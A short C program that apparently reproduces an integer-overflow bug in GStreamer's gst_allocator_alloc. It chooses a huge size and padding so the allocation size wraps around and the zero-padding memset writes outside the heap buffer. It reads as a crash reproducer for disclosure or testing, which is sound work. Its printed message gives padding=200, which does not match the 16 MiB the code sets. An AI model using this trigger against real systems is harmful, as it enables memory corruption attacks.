#include <gst/gst.h>

int
main (int argc, char **argv)
{
  gst_init (&argc, &argv);

  GstAllocationParams params;
  gst_allocation_params_init (&params);
  params.prefix = 0;
  params.padding = 16 * 1024 * 1024;   /* 16 MiB - large enough that the wrapped
                                          "before data" write target lands well
                                          outside any mapped heap region */
  params.flags = GST_MEMORY_FLAG_ZERO_PADDED;

  /* size + prefix + padding wraps to a small maxsize; the actual memset target
   * (data + offset + size) wraps around to roughly (data - padding). */
  gsize size = G_MAXSIZE - (16 * 1024 * 1024) + 1;

  g_print ("calling gst_allocator_alloc(size=%" G_GSIZE_FORMAT
      ", prefix=0, padding=200, ZERO_PADDED)...\n", size);
  GstMemory *mem = gst_allocator_alloc (NULL, size, &params);
  g_print ("gst_allocator_alloc returned %p (should have crashed before this "
      "line if the bug fired)\n", (void *) mem);

  if (mem)
    gst_memory_unref (mem);
  gst_deinit ();
  return 0;
}
